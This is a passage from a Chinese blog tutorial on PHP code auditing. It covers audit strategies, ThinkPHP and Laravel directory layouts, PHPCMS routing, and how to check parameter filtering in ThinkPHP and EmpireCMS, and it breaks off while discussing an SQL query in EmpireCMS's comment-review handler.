<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>Web_9_PHP代码审计 | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.github.io",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!1},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">Web_9_PHP代码审计</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2023-03-24 00:00:00</span> <span class="mobile">2023-03-24 00:00</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-04-09 16:41:16</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/Study/">Study</a>&nbsp;</li><li>| <a href="/tags/PHP/">PHP</a>&nbsp;</li><li>| <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>7.5k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>30 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><p>首先总结一下代码审计的思路</p><blockquote><ol><li>检查敏感函数的参数, 然后回溯变量, 判断变量是否可控, 并且有没有经过严格的过滤, 这是一个逆向追踪的过程</li><li>找出哪些文件在接收外部传入的参数, 然后跟踪变量的传递过程, 观察是否有变量传入到高危函数里面, 或者传递的过程是否有逻辑漏洞, 这是一种正向追踪的方式</li><li>直接挖掘功能点漏洞, 根据自身经验判断该类应用通常在哪些功能中会出现漏洞, 直接全篇阅读该功能代码</li><li>通篇阅读全文代码</li></ol></blockquote><h3 id="了解系统架构"><a href="#了解系统架构" class="headerlink" title="了解系统架构"></a>了解系统架构</h3><p>对于系统架构, 我们在确认了审计目标之后, 在审计之前, 需要先了解目标系统的基本架构, 比如目录情况/是否使用了框架/存在哪些路由/有没有安全过滤函数/有没有全局参数过滤; 这里就要分为有框架和无框架来进行分析</p><h3 id="使用了开发框架"><a href="#使用了开发框架" class="headerlink" title="使用了开发框架"></a>使用了开发框架</h3><h4 id="think-PHP"><a href="#think-PHP" class="headerlink" title="think PHP"></a>think PHP</h4><p>以tp5为例, 框架的大体目录结构如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">www  WEB部署目录（或者子目录）</span><br><span class="line">├─application           应用目录</span><br><span class="line">│  ├─common             公共模块目录（可以更改）</span><br><span class="line">│  ├─module_name        模块目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─config.php         公共配置文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─database.php       数据库配置文件</span><br><span class="line">│</span><br><span class="line">├─<span class="keyword">public</span>                WEB目录（对外访问目录）</span><br><span class="line">│  ├─index.php          入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于apache的重写</span><br><span class="line">│</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言文件目录</span><br><span class="line">│  ├─library            框架类库目录</span><br><span class="line">│  │  ├─think           Think类库包目录</span><br><span class="line">│  │  └─traits          系统Trait目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     框架惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件</span><br><span class="line">│  ├─phpunit.xml        phpunit配置文件</span><br><span class="line">│  └─start.php          框架入口文件</span><br><span class="line">│</span><br><span class="line">├─extend                扩展类库目录</span><br><span class="line">├─runtime               应用的运行时目录（可写，可定制）</span><br><span class="line">├─vendor                第三方类库目录（Composer依赖库）</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure><p>其中, application目录和public目录是应用程序文件目录和运行数据存放目录, 属于重点关注对象</p><p>同时, application目录下的config.php/databse.php/route.php分别是系统配置文件/数据库操作文件/系统路由文件; 都要仔细分析</p><p>对于ThinkPHP框架开发的应用，其访问系统的URL通常是这样的：<code>/index.php/模块名/控制器名/函数名/[参数名/参数值]</code></p><p>其中模块名对应了application目录下的文件夹的名字。控制器名对应了模块名目录下的controller文件夹下的php文件名。参数则是可选的，可以按照<code>/参数名/参数值</code>的方式同时传入多个参数，也可以按照传统方式使用<code>?参数1=参数值1&amp;参数2=参数值2</code>的方式传入变量。</p><h4 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h4><p>基本目录结构:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|——app  包含了站点的controllers（控制器），models（模型），views（视图）和assets（资源</span><br><span class="line">|——bootstrap 存放系统启动时的必要文件，这些文件会被index.php这样的文件调用。</span><br><span class="line">|——<span class="keyword">public</span> 系统运行的公开数据，包括静态资CSS文件、js文件等</span><br><span class="line">|——vender 第三方类库</span><br></pre></td></tr></table></figure><p>主要应用程序放在了app目录下</p><h3 id="没有使用开发框架"><a href="#没有使用开发框架" class="headerlink" title="没有使用开发框架"></a>没有使用开发框架</h3><p>在没有使用开发框架的情况下, 我们需要判断应用程序是否采用了mvc模式, 如果有的话, 需要查看系统的路由文件, 看看控制程序是如何通过路由定位的. 比如PHPCMS, 就是利用了自己开发出来的mvc控制器进行路由</p><p>访问index.php, 可以看到包含了<code>phpcms/base.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PHPCMS_PATH&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> PHPCMS_PATH.<span class="string">&#x27;/phpcms/base.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>进入base.php文件, 就能看到, 这里定义了特别多的路由以及初始化的一些类以及方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//PHPCMS框架路径</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PC_PATH&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;PHPCMS_PATH&#x27;</span>)) <span class="title function_ invoke__">define</span>(<span class="string">&#x27;PHPCMS_PATH&#x27;</span>, PC_PATH.<span class="string">&#x27;..&#x27;</span>.DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"><span class="comment">//缓存文件夹地址</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CACHE_PATH&#x27;</span>, PHPCMS_PATH.<span class="string">&#x27;caches&#x27;</span>.DIRECTORY_SEPARATOR);</span><br><span class="line"><span class="comment">//主机协议</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SITE_PROTOCOL&#x27;</span>, <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] == <span class="string">&#x27;443&#x27;</span> ? <span class="string">&#x27;https://&#x27;</span> : <span class="string">&#x27;http://&#x27;</span>);</span><br><span class="line"><span class="comment">//当前访问的主机名</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;SITE_URL&#x27;</span>, (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] : <span class="string">&#x27;&#x27;</span>));</span><br><span class="line"><span class="comment">//来源</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>, <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">//定义网站根路径</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEB_PATH&#x27;</span>,pc_base::<span class="title function_ invoke__">load_config</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;web_path&#x27;</span>));</span><br><span class="line"><span class="comment">//js 路径</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;JS_PATH&#x27;</span>,pc_base::<span class="title function_ invoke__">load_config</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;js_path&#x27;</span>));</span><br><span class="line"><span class="comment">//css 路径</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CSS_PATH&#x27;</span>,pc_base::<span class="title function_ invoke__">load_config</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;css_path&#x27;</span>));</span><br><span class="line"><span class="comment">//img 路径</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;IMG_PATH&#x27;</span>,pc_base::<span class="title function_ invoke__">load_config</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;img_path&#x27;</span>));</span><br><span class="line"><span class="comment">//动态程序路径</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_PATH&#x27;</span>,pc_base::<span class="title function_ invoke__">load_config</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;app_path&#x27;</span>));</span><br><span class="line"><span class="comment">//应用静态文件路径</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PLUGIN_STATICS_PATH&#x27;</span>,WEB_PATH.<span class="string">&#x27;statics/plugin/&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pc_base</span> </span>&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于没有使用框架, 也没有使用自定义的mvc模型的程序, 就只需要按照传统的脚本格式的访问方式就行, 以index.php作为切入点, 依次分析相关源码即可</p><h3 id="参数过滤分析"><a href="#参数过滤分析" class="headerlink" title="参数过滤分析"></a>参数过滤分析</h3><p>传统参数过滤分析, 通常会以函数的方式进行过滤, 但是某些系统也可能会在参数传入后, 进行全局参数过滤, 所以我们在审计之前, 就需要先了解应用程序采用了哪些过滤方法, 是否使用了全局参数过滤</p><h4 id="mvc模式下的过滤情况分析"><a href="#mvc模式下的过滤情况分析" class="headerlink" title="mvc模式下的过滤情况分析"></a>mvc模式下的过滤情况分析</h4><p>首先以tp来说, 获取参数的方式有两种, 一是通过原生的<code>$_GET</code>等方式获取参数, 二是通过<code>$Request()</code>对象获取参数. 在审计think PHP程序的时候,就需要对这两种参数进行审计</p><p>在tp中, 会在config文件中定义一个默认的全局过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line"><span class="string">&#x27;default_filter&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br></pre></td></tr></table></figure><p>比如像上面这样, 默认的过滤器为空, 也就是说在使用<code>$_GET</code>等原始方法获取参数的时候, 就是不会进行过滤的</p><p>然后再来看看<code>$Request</code>对象获取参数时是如何进行的, 比如request对象的get方法, 是用于获取GET方式传入的参数的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;get)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;get = <span class="variable">$_GET</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;param      = [];</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;get = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里定义了三个形参，分别是name、default、filter。其中name是我们要获取的变量名，而fileter则是我们要是用的过滤器，这里默认为空，也就是不进行任何过滤。</p><p>所以在进行审计的时候，我们就需要判断是否设置了默认的全局过滤选项，或者说是否在获取参数的时候，设置了新的过滤器。</p><h4 id="原生php模式下的过滤分析"><a href="#原生php模式下的过滤分析" class="headerlink" title="原生php模式下的过滤分析"></a>原生php模式下的过滤分析</h4><p>对于原生的php开发的应用程序, 往往是通过函数的方式来设置过滤规则, 所以就需要在参数获取的地方来看看, 是否调用了参数过滤函数来进行过滤来进行过滤, 并判断是否是有效过滤</p><p>这里以<code>帝国CMS</code>为例, 进行一个简单的分析. 帝国cms的过滤函数在<code>e/class/connect.php</code>中, 定义了三个参数处理函数, 这里以其中一个为例, 进行分析:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参数处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RepPostVar</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$val</span>!=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$val</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">CkPostStrChar</span>(<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%20&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%27&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;#&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;--&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$val</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">RepPostStr</span>(<span class="variable">$val</span>,<span class="number">1</span>);</span><br><span class="line">	<span class="variable">$val</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$val</span>);</span><br><span class="line">	<span class="comment">//FireWall</span></span><br><span class="line">	<span class="title function_ invoke__">FWClearGetText</span>(<span class="variable">$val</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见, 这里对% 空格 ` %20 %27 * ‘ \ / ; # –进行了过滤</p><p>然后我们可以具体到文件中, 看看传入的参数是否都调用了该函数进行过滤, 比如这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//审核评论</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$plid</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;plid&#x27;</span>];</span><br><span class="line">	<span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	<span class="variable">$bclassid</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;bclassid&#x27;</span>];</span><br><span class="line">	<span class="variable">$classid</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;classid&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">CheckPl_all</span>(<span class="variable">$plid</span>,<span class="variable">$id</span>,<span class="variable">$bclassid</span>,<span class="variable">$classid</span>,<span class="variable">$logininid</span>,<span class="variable">$loginin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckPl_all</span>(<span class="params"><span class="variable">$plid</span>,<span class="variable">$id</span>,<span class="variable">$bclassid</span>,<span class="variable">$classid</span>,<span class="variable">$userid</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$empire</span>,<span class="variable">$class_r</span>,<span class="variable">$dbtbpre</span>,<span class="variable">$public_r</span>;</span><br><span class="line">	<span class="comment">//验证权限</span></span><br><span class="line">	<span class="variable">$restb</span>=(<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;restb&#x27;</span>];</span><br><span class="line">	<span class="variable">$count</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$plid</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$count</span>)||!<span class="variable">$restb</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">printerror</span>(<span class="string">&quot;NotCheckPlid&quot;</span>,<span class="string">&quot;history.go(-1)&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$public_r</span>[<span class="string">&#x27;pldatatbs&#x27;</span>],<span class="string">&#x27;,&#x27;</span>.<span class="variable">$restb</span>.<span class="string">&#x27;,&#x27;</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">printerror</span>(<span class="string">&quot;NotCheckPlid&quot;</span>,<span class="string">&quot;history.go(-1)&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$add</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$docheck</span>=(<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;docheck&#x27;</span>];</span><br><span class="line">	<span class="variable">$docheck</span>=<span class="variable">$docheck</span>?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$count</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="variable">$add</span>.=<span class="string">&quot;plid=&#x27;&quot;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$plid</span>[<span class="variable">$i</span>]).<span class="string">&quot;&#x27; or &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$add</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$add</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$add</span>)-<span class="number">4</span>);</span><br><span class="line">	<span class="variable">$sql</span>=<span class="variable">$empire</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update <span class="subst">&#123;$dbtbpre&#125;</span>enewspl_<span class="subst">&#123;$restb&#125;</span> set checked=&#x27;<span class="subst">$docheck</span>&#x27; where &quot;</span>.<span class="variable">$add</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$sql</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		....</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如这里, 后台评论管理的地方, 获取了评论和ID等参数, 在未经过滤的情况下, 